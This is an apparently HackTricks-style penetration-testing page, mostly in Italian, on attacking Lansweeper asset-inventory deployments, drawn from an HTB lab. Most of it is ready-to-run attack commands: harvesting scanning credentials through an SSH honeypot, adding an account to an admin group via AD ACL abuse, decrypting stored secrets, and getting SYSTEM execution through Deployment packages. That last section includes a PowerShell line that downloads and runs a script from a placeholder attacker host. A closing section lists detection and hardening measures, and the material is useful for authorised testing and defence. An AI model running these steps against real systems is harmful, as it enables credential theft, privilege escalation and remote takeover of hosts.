# Lansweeper Abuse: Credential Harvesting, Secrets Decryption, and Deployment RCE

{{#include ../../banners/hacktricks-training.md}}

Lansweeper è una piattaforma di discovery e inventory degli asset IT comunemente distribuita su Windows e integrata con Active Directory. Le credenziali configurate in Lansweeper sono usate dai suoi scanning engines per autenticarsi agli asset tramite protocolli come SSH, SMB/WMI e WinRM. Configurazioni errate permettono frequentemente:

- Intercettazione delle credenziali reindirizzando un Scanning Target verso un host controllato dall'attaccante (honeypot)
- Abuso delle AD ACLs esposte dai gruppi legati a Lansweeper per ottenere accesso remoto
- Decrittazione on-host dei secrets configurati in Lansweeper (connection strings e stored scanning credentials)
- Esecuzione di codice sugli endpoint gestiti tramite la feature Deployment (spesso eseguita come SYSTEM)

Questa pagina riassume workflow pratici dell'attaccante e comandi per abusare di questi comportamenti durante gli engagement.

## 1) Harvest scanning credentials via honeypot (SSH example)

Idea: crea un Scanning Target che punti al tuo host e associa le Scanning Credentials esistenti ad esso. Quando lo scan viene eseguito, Lansweeper tenterà di autenticarsi con quelle credenziali e il tuo honeypot le catturerà.

Steps overview (web UI):
- Scanning → Scanning Targets → Add Scanning Target
- Type: IP Range (or Single IP) = your VPN IP
- Configure SSH port to something reachable (e.g., 2022 if 22 is blocked)
- Disattiva lo schedule e imposta l'esecuzione manuale
- Scanning → Scanning Credentials → assicurati che esistano credenziali Linux/SSH; mappale sul nuovo target (abilita tutte quelle necessarie)
- Clicca “Scan now” sul target
- Run an SSH honeypot and retrieve the attempted username/password

Example with sshesame:
```yaml
# sshesame.conf
server:
listen_address: 10.10.14.79:2022
```

```bash
# Install and run
sudo apt install -y sshesame
sshesame --config sshesame.conf
# Expect client banner similar to RebexSSH and cleartext creds
# authentication for user "svc_inventory_lnx" with password "<password>" accepted
# connection with client version "SSH-2.0-RebexSSH_5.0.x" established
```
Validare le credenziali catturate contro i servizi del DC:
```bash
# SMB/LDAP/WinRM checks (NetExec)
netexec smb   inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec ldap  inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Note
- Funziona in modo simile per altri protocolli quando puoi forzare lo scanner verso il tuo listener (SMB/WinRM honeypots, ecc.). SSH è spesso la soluzione più semplice.
- Molti scanner si identificano con client banners distinti (e.g., RebexSSH) e tenteranno comandi benigni (uname, whoami, ecc.).

## 2) AD ACL abuse: ottenere accesso remoto aggiungendosi a un app-admin group

Usa BloodHound per enumerare i diritti effettivi dall'account compromesso. Una scoperta comune è un gruppo specifico per scanner o app (e.g., “Lansweeper Discovery”) che possiede GenericAll su un gruppo privilegiato (e.g., “Lansweeper Admins”). Se il gruppo privilegiato è inoltre membro di “Remote Management Users”, WinRM diventa disponibile una volta che ci aggiungiamo.

Esempi di raccolta:
```bash
# NetExec collection with LDAP
netexec ldap inventory.sweep.vl -u svc_inventory_lnx -p '<password>' --bloodhound -c All --dns-server <DC_IP>

# RustHound-CE collection (zip for BH CE import)
rusthound-ce --domain sweep.vl -u svc_inventory_lnx -p '<password>' -c All --zip
```
Sfruttare GenericAll su un gruppo con BloodyAD (Linux):
```bash
# Add our user into the target group
bloodyAD --host inventory.sweep.vl -d sweep.vl -u svc_inventory_lnx -p '<password>' \
add groupMember "Lansweeper Admins" svc_inventory_lnx

# Confirm WinRM access if the group grants it
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Poi ottieni una shell interattiva:
```bash
evil-winrm -i inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Suggerimento: le operazioni Kerberos sono sensibili al tempo. Se ricevi KRB_AP_ERR_SKEW, sincronizza l'orologio con il DC prima:
```bash
sudo ntpdate <dc-fqdn-or-ip>   # or rdate -n <dc-ip>
```
## 3) Decriptare i segreti configurati da Lansweeper sull'host

Sul server Lansweeper, il sito ASP.NET di solito memorizza una connection string crittografata e una chiave simmetrica utilizzata dall'applicazione. Con accesso locale adeguato puoi decriptare la connection string del DB e quindi estrarre le credenziali di scansione memorizzate.

Posizioni tipiche:
- Web config: `C:\Program Files (x86)\Lansweeper\Website\web.config`
- `<connectionStrings configProtectionProvider="DataProtectionConfigurationProvider">` … `<EncryptedData>…`
- Application key: `C:\Program Files (x86)\Lansweeper\Key\Encryption.txt`

Usa SharpLansweeperDecrypt per automatizzare la decriptazione e l'estrazione delle credenziali memorizzate:
```powershell
# From a WinRM session or interactive shell on the Lansweeper host
# PowerShell variant
Upload-File .\LansweeperDecrypt.ps1 C:\ProgramData\LansweeperDecrypt.ps1   # depending on your shell
powershell -ExecutionPolicy Bypass -File C:\ProgramData\LansweeperDecrypt.ps1
# Tool will:
#  - Decrypt connectionStrings from web.config
#  - Connect to Lansweeper DB
#  - Decrypt stored scanning credentials and print them in cleartext
```
L'output previsto include dettagli di connessione DB e credenziali di scansione in chiaro, come account Windows e Linux usati in tutto l'ambiente. Questi spesso hanno privilegi locali elevati sugli host di dominio:
```text
Inventory Windows  SWEEP\svc_inventory_win  <StrongPassword!>
Inventory Linux    svc_inventory_lnx        <StrongPassword!>
```
Usa creds di scansione Windows recuperate per accesso privilegiato:
```bash
netexec winrm inventory.sweep.vl -u svc_inventory_win -p '<StrongPassword!>'
# Typically local admin on the Lansweeper-managed host; often Administrators on DCs/servers
```
## 4) Lansweeper Deployment → SYSTEM RCE

Come membro del gruppo “Lansweeper Admins”, l'interfaccia web espone Deployment e Configuration. Sotto Deployment → Deployment packages, puoi creare pacchetti che eseguono comandi arbitrari sugli asset target. L'esecuzione è svolta dal Lansweeper service con privilegi elevati, permettendo l'esecuzione di codice come NT AUTHORITY\SYSTEM sull'host selezionato.

High-level steps:
- Crea un nuovo Deployment package che esegue un one-liner PowerShell o cmd (reverse shell, add-user, etc.).
- Seleziona l'asset desiderato (es. il DC/host dove gira Lansweeper) e clicca Deploy/Run now.
- Ottieni la shell come SYSTEM.

Example payloads (PowerShell):
```powershell
# Simple test
powershell -nop -w hidden -c "whoami > C:\Windows\Temp\ls_whoami.txt"

# Reverse shell example (adapt to your listener)
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<attacker>/rs.ps1')"
```
OPSEC
- Le azioni di Deployment sono rumorose e lasciano tracce in Lansweeper e nei registri eventi di Windows. Usare con giudizio.

## Rilevamento e hardening

- Restringere o rimuovere le enumerazioni SMB anonime. Monitorare RID cycling e accessi anomali alle condivisioni di Lansweeper.
- Controlli di egress: bloccare o limitare strettamente le connessioni outbound SSH/SMB/WinRM dagli host scanner. Generare alert su porte non standard (es., 2022) e banner client insoliti come Rebex.
- Proteggere `Website\\web.config` e `Key\\Encryption.txt`. Esternalizzare i segreti in un vault e ruotarli in caso di esposizione. Considerare service account con privilegi minimi e gMSA quando possibile.
- Monitoraggio AD: generare alert su modifiche ai gruppi legati a Lansweeper (es., “Lansweeper Admins”, “Remote Management Users”) e su cambiamenti di ACL che concedono GenericAll/Write membership su gruppi privilegiati.
- Audit delle creazioni/modifiche/esecuzioni dei Deployment package; generare alert su package che avviano cmd.exe/powershell.exe o connessioni outbound non previste.

## Argomenti correlati
- SMB/LSA/SAMR enumeration e RID cycling
- Kerberos password spraying e considerazioni sul clock skew
- Analisi dei path in BloodHound dei gruppi application-admin
- Uso di WinRM e lateral movement

## References
- [HTB: Sweep — Abusing Lansweeper Scanning, AD ACLs, and Secrets to Own a DC (0xdf)](https://0xdf.gitlab.io/2025/08/14/htb-sweep.html)
- [sshesame (SSH honeypot)](https://github.com/jaksi/sshesame)
- [SharpLansweeperDecrypt](https://github.com/Yeeb1/SharpLansweeperDecrypt)
- [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [BloodHound CE](https://github.com/SpecterOps/BloodHound)

{{#include ../../banners/hacktricks-training.md}}
